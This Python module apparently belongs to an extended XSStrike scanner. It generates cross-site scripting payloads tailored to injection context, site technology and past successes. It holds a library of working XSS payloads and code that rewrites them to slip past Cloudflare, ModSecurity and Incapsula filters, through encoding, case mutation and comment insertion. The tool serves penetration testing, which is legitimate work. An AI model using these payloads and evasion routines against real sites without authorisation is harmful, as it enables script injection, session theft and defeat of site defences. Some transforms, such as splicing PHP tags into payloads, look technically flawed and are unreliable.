"""
Context-Aware Payload Generator for XSStrike.

This module generates intelligent, adaptive XSS payloads based on target
characteristics, technology stack, and historical success patterns from
the knowledge base.
"""

import re
import random
from typing import Dict, List, Any, Optional, Tuple, Set
from dataclasses import dataclass
from urllib.parse import quote, unquote

from core.knowledge_base import knowledge_base, Target, Payload
from core.rag_system import rag_system
from core.log import setup_logger

logger = setup_logger(__name__)


@dataclass
class InjectionContext:
    """Represents the context where payload will be injected."""
    context_type: str  # html, script, attribute, url, etc.
    tag_name: str = ""
    attribute_name: str = ""
    attribute_value: str = ""
    surrounding_code: str = ""
    quote_style: str = ""  # single, double, none
    encoding_required: bool = False
    waf_present: bool = False
    waf_type: str = ""


class PayloadTemplate:
    """Template for generating contextual payloads."""

    def __init__(self, template: str, contexts: List[str],
                 bypass_techniques: List[str], effectiveness: float = 0.5):
        self.template = template
        self.contexts = contexts
        self.bypass_techniques = bypass_techniques
        self.effectiveness = effectiveness
        self.variations = []

    def generate_payload(self, context: InjectionContext,
                         target: Optional[Target] = None) -> str:
        """Generate a payload for specific context."""
        payload = self.template

        # Apply context-specific transformations
        if context.context_type == "attribute":
            payload = self._adapt_for_attribute(payload, context)
        elif context.context_type == "script":
            payload = self._adapt_for_script(payload, context)
        elif context.context_type == "html":
            payload = self._adapt_for_html(payload, context)
        elif context.context_type == "url":
            payload = self._adapt_for_url(payload, context)

        # Apply WAF bypass techniques
        if context.waf_present:
            payload = self._apply_waf_bypass(payload, context.waf_type)

        # Apply target-specific adaptations
        if target:
            payload = self._adapt_for_target(payload, target)

        return payload

    def _adapt_for_attribute(self, payload: str, context: InjectionContext) -> str:
        """Adapt payload for attribute injection."""
        quote = context.quote_style

        if quote == "single":
            # Break out of single quotes
            payload = f"'{payload}"
        elif quote == "double":
            # Break out of double quotes
            payload = f'"{payload}'
        else:
            # No quotes, need to be careful with spaces
            payload = payload.replace(" ", "/**/")

        return payload

    def _adapt_for_script(self, payload: str, context: InjectionContext) -> str:
        """Adapt payload for script context."""
        # If we're inside a script tag, we can use JavaScript directly
        if "<script>" in payload:
            # Remove script tags as we're already in script context
            payload = re.sub(r'</?script[^>]*>', '', payload)

        # Add JavaScript-specific escaping
        payload = payload.replace('"', '\\"').replace("'", "\\'")

        return payload

    def _adapt_for_html(self, payload: str, context: InjectionContext) -> str:
        """Adapt payload for HTML context."""
        # Standard HTML injection, ensure proper tag closure
        return payload

    def _adapt_for_url(self, payload: str, context: InjectionContext) -> str:
        """Adapt payload for URL parameter injection."""
        if context.encoding_required:
            payload = quote(payload)

        return payload

    def _apply_waf_bypass(self, payload: str, waf_type: str) -> str:
        """Apply WAF-specific bypass techniques."""
        if waf_type == "cloudflare":
            # Cloudflare-specific bypasses
            payload = payload.replace('<', '＜').replace('>', '＞')
        elif waf_type == "modsecurity":
            # ModSecurity bypasses
            payload = payload.replace('script', 'scr\\x69pt')
        elif waf_type == "incapsula":
            # Incapsula bypasses
            payload = payload.replace(' ', '/**/').replace('=', '\\x3D')

        return payload

    def _adapt_for_target(self, payload: str, target: Target) -> str:
        """Adapt payload for specific target characteristics."""
        # Technology-specific adaptations
        for tech in target.technology_stack:
            if tech == "php":
                # PHP-specific payload modifications
                if "alert" in payload:
                    payload = payload.replace("alert", "<?php echo 'alert'?>")
            elif tech == "asp":
                # ASP.NET-specific modifications
                if "script" in payload:
                    payload = payload.replace("script", "<%='script'%>")

        return payload


class ContextAwarePayloadGenerator:
    """
    Main payload generator that creates context-aware, intelligent payloads.
    
    This generator considers target characteristics, injection context,
    historical success patterns, and WAF bypass techniques to create
    highly effective payloads.
    """

    def __init__(self):
        self.logger = setup_logger(__name__)
        self.templates = self._initialize_templates()
        self.encoding_map = {
            'html': {'<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#x27;'},
            'url': {'<': '%3C', '>': '%3E', '"': '%22', "'": '%27'},
            'js': {'<': '\\x3C', '>': '\\x3E', '"': '\\"', "'": "\\'"},
        }
        self.bypass_techniques = {
            'case_variation': self._apply_case_variation,
            'encoding': self._apply_encoding,
            'comment_insertion': self._apply_comment_insertion,
            'whitespace_manipulation': self._apply_whitespace_manipulation,
            'quote_variation': self._apply_quote_variation,
            'concatenation': self._apply_concatenation,
            'unicode_bypass': self._apply_unicode_bypass,
            'double_encoding': self._apply_double_encoding,
        }

    def _initialize_templates(self) -> List[PayloadTemplate]:
        """Initialize payload templates with different contexts and techniques."""
        templates = []

        # Basic XSS templates
        templates.extend([
            PayloadTemplate(
                "<script>alert(1)</script>",
                ["html", "attribute"],
                ["basic"],
                0.7
            ),
            PayloadTemplate(
                "<img src=x onerror=alert(1)>",
                ["html", "attribute"],
                ["event_handler"],
                0.8
            ),
            PayloadTemplate(
                "javascript:alert(1)",
                ["attribute", "url"],
                ["protocol"],
                0.6
            ),
            PayloadTemplate(
                "<svg onload=alert(1)>",
                ["html"],
                ["svg", "event_handler"],
                0.7
            ),
            PayloadTemplate(
                "<iframe src=javascript:alert(1)>",
                ["html"],
                ["iframe", "protocol"],
                0.6
            ),
        ])

        # Advanced bypass templates
        templates.extend([
            PayloadTemplate(
                "<scr<script>ipt>alert(1)</scr</script>ipt>",
                ["html"],
                ["nested_tags"],
                0.5
            ),
            PayloadTemplate(
                "<script>al\\x65rt(1)</script>",
                ["html", "script"],
                ["hex_encoding"],
                0.6
            ),
            PayloadTemplate(
                "<ScRiPt>alert(1)</ScRiPt>",
                ["html"],
                ["case_variation"],
                0.6
            ),
            PayloadTemplate(
                "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
                ["html", "script"],
                ["char_encoding"],
                0.5
            ),
        ])

        # Context-specific templates
        templates.extend([
            PayloadTemplate(
                "';alert(1);//",
                ["script"],
                ["script_break"],
                0.8
            ),
            PayloadTemplate(
                '";alert(1);//',
                ["script"],
                ["script_break"],
                0.8
            ),
            PayloadTemplate(
                "'-alert(1)-'",
                ["attribute"],
                ["attribute_break"],
                0.7
            ),
            PayloadTemplate(
                '">alert(1)<"',
                ["attribute"],
                ["attribute_break"],
                0.7
            ),
        ])

        # WAF bypass templates
        templates.extend([
            PayloadTemplate(
                "<img src=1 onerror=al\\u0065rt(1)>",
                ["html"],
                ["unicode_bypass"],
                0.6
            ),
            PayloadTemplate(
                "<svg/onload=alert(1)>",
                ["html"],
                ["slash_bypass"],
                0.7
            ),
            PayloadTemplate(
                "<img src=x:alert(1) onerror=eval(src)>",
                ["html"],
                ["pseudo_protocol"],
                0.5
            ),
        ])

        return templates

    def generate_payloads(self, target: Target, context: InjectionContext,
                          max_payloads: int = 50) -> List[Payload]:
        """
        Generate context-aware payloads for a target.
        
        Args:
            target: Target characteristics
            context: Injection context
            max_payloads: Maximum number of payloads to generate
            
        Returns:
            List[Payload]: Generated payloads sorted by effectiveness
        """
        self.logger.info(f"Generating payloads for {target.domain} in {context.context_type} context")

        payloads = []

        # Get historical successful payloads for this context
        historical_payloads = knowledge_base.get_payloads_for_context(
            context.context_type, limit=20
        )

        # Get RAG recommendations
        rag_analysis = rag_system.analyze_and_recommend(
            target.url, target.response_headers, ""
        )
        recommended_payloads = rag_analysis.get('payload_recommendations', [])

        # Generate payloads from templates
        template_payloads = self._generate_from_templates(target, context)

        # Generate adaptive payloads
        adaptive_payloads = self._generate_adaptive_payloads(target, context, historical_payloads)

        # Generate mutation-based payloads
        mutation_payloads = self._generate_mutation_payloads(target, context, recommended_payloads)

        # Combine all payloads
        all_payloads = (template_payloads + adaptive_payloads +
                        mutation_payloads + [p[0] for p in recommended_payloads])

        # Remove duplicates and score
        unique_payloads = self._deduplicate_and_score(all_payloads, target, context)

        # Sort by effectiveness and limit
        unique_payloads.sort(key=lambda p: p.success_rate, reverse=True)
        final_payloads = unique_payloads[:max_payloads]

        self.logger.info(f"Generated {len(final_payloads)} unique payloads")

        return final_payloads

    def _generate_from_templates(self, target: Target,
                                 context: InjectionContext) -> List[Payload]:
        """Generate payloads from templates."""
        payloads = []

        for template in self.templates:
            if context.context_type in template.contexts:
                # Generate base payload
                payload_str = template.generate_payload(context, target)

                payload = Payload(
                    payload=payload_str,
                    payload_type="reflected",
                    contexts=[context.context_type],
                    bypass_techniques=template.bypass_techniques.copy(),
                    success_rate=template.effectiveness
                )
                payloads.append(payload)

                # Generate variations
                variations = self._generate_template_variations(template, target, context)
                payloads.extend(variations)

        return payloads

    def _generate_template_variations(self, template: PayloadTemplate,
                                      target: Target, context: InjectionContext) -> List[Payload]:
        """Generate variations of a template payload."""
        variations = []
        base_payload = template.generate_payload(context, target)

        # Apply different bypass techniques
        for technique_name, technique_func in self.bypass_techniques.items():
            if technique_name not in template.bypass_techniques:
                varied_payload = technique_func(base_payload, context)

                if varied_payload != base_payload:
                    payload = Payload(
                        payload=varied_payload,
                        payload_type="reflected",
                        contexts=[context.context_type],
                        bypass_techniques=template.bypass_techniques + [technique_name],
                        success_rate=template.effectiveness * 0.8  # Slightly lower for variations
                    )
                    variations.append(payload)

        return variations[:5]  # Limit variations per template

    def _generate_adaptive_payloads(self, target: Target, context: InjectionContext,
                                    historical_payloads: List[Payload]) -> List[Payload]:
        """Generate adaptive payloads based on historical success."""
        adaptive_payloads = []

        # Analyze historical payloads for patterns
        successful_patterns = self._extract_successful_patterns(historical_payloads)

        # Generate new payloads based on successful patterns
        for pattern in successful_patterns[:10]:  # Top 10 patterns
            new_payloads = self._generate_from_pattern(pattern, target, context)
            adaptive_payloads.extend(new_payloads)

        return adaptive_payloads

    def _generate_mutation_payloads(self, target: Target, context: InjectionContext,
                                    base_payloads: List[Tuple[Payload, float]]) -> List[Payload]:
        """Generate payloads through mutation of successful ones."""
        mutation_payloads = []

        for payload, score in base_payloads[:10]:  # Mutate top 10
            mutations = self._mutate_payload(payload, target, context)
            mutation_payloads.extend(mutations)

        return mutation_payloads

    def _extract_successful_patterns(self, payloads: List[Payload]) -> List[Dict[str, Any]]:
        """Extract successful patterns from historical payloads."""
        patterns = []

        # Group by common characteristics
        technique_groups = {}
        for payload in payloads:
            if payload.success_rate > 0.3:  # Only successful payloads
                for technique in payload.bypass_techniques:
                    if technique not in technique_groups:
                        technique_groups[technique] = []
                    technique_groups[technique].append(payload)

        # Create patterns from successful techniques
        for technique, technique_payloads in technique_groups.items():
            if len(technique_payloads) >= 2:  # At least 2 successful payloads
                avg_success = sum(p.success_rate for p in technique_payloads) / len(technique_payloads)
                patterns.append({
                    'technique': technique,
                    'success_rate': avg_success,
                    'payloads': technique_payloads[:3]  # Sample payloads
                })

        # Sort by success rate
        patterns.sort(key=lambda p: p['success_rate'], reverse=True)
        return patterns

    def _generate_from_pattern(self, pattern: Dict[str, Any], target: Target,
                               context: InjectionContext) -> List[Payload]:
        """Generate new payloads from a successful pattern."""
        new_payloads = []
        technique = pattern['technique']
        sample_payloads = pattern['payloads']

        # Extract common elements from sample payloads
        common_elements = self._find_common_elements([p.payload for p in sample_payloads])

        # Generate new payloads using common elements
        for element in common_elements:
            if technique in self.bypass_techniques:
                # Apply the successful technique to new base payloads
                for base in ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]:
                    modified = base.replace("alert(1)", element)
                    final_payload = self.bypass_techniques[technique](modified, context)

                    payload = Payload(
                        payload=final_payload,
                        payload_type="reflected",
                        contexts=[context.context_type],
                        bypass_techniques=[technique],
                        success_rate=pattern['success_rate'] * 0.7
                    )
                    new_payloads.append(payload)

        return new_payloads[:3]  # Limit generated payloads

    def _find_common_elements(self, payloads: List[str]) -> List[str]:
        """Find common elements across payloads."""
        if not payloads:
            return []

        # Simple approach: find common substrings
        common_elements = []
        for i, payload1 in enumerate(payloads):
            for j, payload2 in enumerate(payloads[i + 1:], i + 1):
                # Find common substrings of length > 3
                for k in range(len(payload1)):
                    for l in range(k + 4, len(payload1) + 1):
                        substring = payload1[k:l]
                        if substring in payload2 and substring not in common_elements:
                            common_elements.append(substring)

        return common_elements[:5]  # Top 5 common elements

    def _mutate_payload(self, payload: Payload, target: Target,
                        context: InjectionContext) -> List[Payload]:
        """Generate mutations of a payload."""
        mutations = []
        base_payload = payload.payload

        mutation_strategies = [
            self._mutate_tag_names,
            self._mutate_event_handlers,
            self._mutate_functions,
            self._mutate_encoding,
            self._mutate_structure
        ]

        for strategy in mutation_strategies:
            mutated = strategy(base_payload, context)
            if mutated != base_payload:
                new_payload = Payload(
                    payload=mutated,
                    payload_type=payload.payload_type,
                    contexts=payload.contexts.copy(),
                    bypass_techniques=payload.bypass_techniques + ["mutation"],
                    success_rate=payload.success_rate * 0.8
                )
                mutations.append(new_payload)

        return mutations

    def _mutate_tag_names(self, payload: str, context: InjectionContext) -> str:
        """Mutate HTML tag names."""
        tag_mutations = {
            'script': ['SCRIPT', 'Script', 'scr\\x69pt'],
            'img': ['IMG', 'Img', 'i\\x6dg'],
            'svg': ['SVG', 'Svg', 's\\x76g']
        }

        for original, mutations in tag_mutations.items():
            if original in payload.lower():
                return payload.replace(original, random.choice(mutations))

        return payload

    def _mutate_event_handlers(self, payload: str, context: InjectionContext) -> str:
        """Mutate event handlers."""
        handler_mutations = {
            'onerror': ['onError', 'ONERROR', 'on\\x65rror'],
            'onload': ['onLoad', 'ONLOAD', 'on\\x6coad'],
            'onclick': ['onClick', 'ONCLICK', 'on\\x63lick']
        }

        for original, mutations in handler_mutations.items():
            if original in payload.lower():
                return payload.replace(original, random.choice(mutations))

        return payload

    def _mutate_functions(self, payload: str, context: InjectionContext) -> str:
        """Mutate JavaScript functions."""
        function_mutations = {
            'alert': ['prompt', 'confirm', 'eval'],
            'eval': ['Function', 'setTimeout'],
        }

        for original, mutations in function_mutations.items():
            if original in payload:
                return payload.replace(original, random.choice(mutations))

        return payload

    def _mutate_encoding(self, payload: str, context: InjectionContext) -> str:
        """Apply different encoding mutations."""
        # URL encode some characters
        chars_to_encode = ['<', '>', '"', "'", '(', ')']
        mutated = payload

        for char in chars_to_encode:
            if char in mutated and random.random() > 0.5:
                mutated = mutated.replace(char, f'%{ord(char):02x}')

        return mutated

    def _mutate_structure(self, payload: str, context: InjectionContext) -> str:
        """Mutate payload structure."""
        mutations = [
            lambda p: p.replace(' ', '/**/'),  # Comment insertion
            lambda p: p.replace('=', '\\x3D'),  # Hex encoding
            lambda p: p.replace('>', '\\x3E'),  # Hex encoding
            lambda p: p.upper() if random.random() > 0.5 else p.lower(),  # Case mutation
        ]

        mutation = random.choice(mutations)
        return mutation(payload)

    def _deduplicate_and_score(self, payloads: List[Payload], target: Target,
                               context: InjectionContext) -> List[Payload]:
        """Remove duplicates and recalculate scores."""
        seen_hashes = set()
        unique_payloads = []

        for payload in payloads:
            if payload.payload_hash not in seen_hashes:
                seen_hashes.add(payload.payload_hash)

                # Recalculate score based on target and context
                new_score = self._calculate_contextual_score(payload, target, context)
                payload.success_rate = new_score

                unique_payloads.append(payload)

        return unique_payloads

    def _calculate_contextual_score(self, payload: Payload, target: Target,
                                    context: InjectionContext) -> float:
        """Calculate contextual effectiveness score."""
        base_score = payload.success_rate

        # Context match bonus
        if context.context_type in payload.contexts:
            base_score *= 1.2

        # WAF penalty/bonus
        if context.waf_present and target.waf_detected:
            if target.waf_detected in payload.waf_effectiveness:
                waf_factor = payload.waf_effectiveness[target.waf_detected]
                base_score *= (1.0 + waf_factor)
            else:
                base_score *= 0.7  # Penalty for unknown WAF effectiveness

        # Technology stack bonus
        tech_bonus = 0
        for tech in target.technology_stack:
            if any(tech.lower() in technique.lower() for technique in payload.bypass_techniques):
                tech_bonus += 0.1

        base_score *= (1.0 + tech_bonus)

        return min(base_score, 1.0)

    # Bypass technique implementations
    def _apply_case_variation(self, payload: str, context: InjectionContext) -> str:
        """Apply case variation bypass."""
        return ''.join(c.upper() if i % 2 == 0 else c.lower()
                       for i, c in enumerate(payload))

    def _apply_encoding(self, payload: str, context: InjectionContext) -> str:
        """Apply encoding bypass."""
        encoding_type = context.context_type
        if encoding_type in self.encoding_map:
            encoded = payload
            for char, encoded_char in self.encoding_map[encoding_type].items():
                encoded = encoded.replace(char, encoded_char)
            return encoded
        return payload

    def _apply_comment_insertion(self, payload: str, context: InjectionContext) -> str:
        """Apply comment insertion bypass."""
        if context.context_type == "html":
            return payload.replace('<', '<!--><')
        elif context.context_type == "script":
            return payload.replace(';', '/**/;')
        return payload

    def _apply_whitespace_manipulation(self, payload: str, context: InjectionContext) -> str:
        """Apply whitespace manipulation bypass."""
        return payload.replace(' ', '\t').replace('=', ' = ')

    def _apply_quote_variation(self, payload: str, context: InjectionContext) -> str:
        """Apply quote variation bypass."""
        return payload.replace('"', "'").replace("'", '`')

    def _apply_concatenation(self, payload: str, context: InjectionContext) -> str:
        """Apply string concatenation bypass."""
        if 'alert' in payload:
            return payload.replace('alert', 'al\'+\'ert')
        return payload

    def _apply_unicode_bypass(self, payload: str, context: InjectionContext) -> str:
        """Apply Unicode bypass."""
        return payload.replace('e', '\\u0065').replace('a', '\\u0061')

    def _apply_double_encoding(self, payload: str, context: InjectionContext) -> str:
        """Apply double encoding bypass."""
        # First encode
        encoded = quote(payload)
        # Second encode
        return quote(encoded)


# Global payload generator instance
payload_generator = ContextAwarePayloadGenerator()
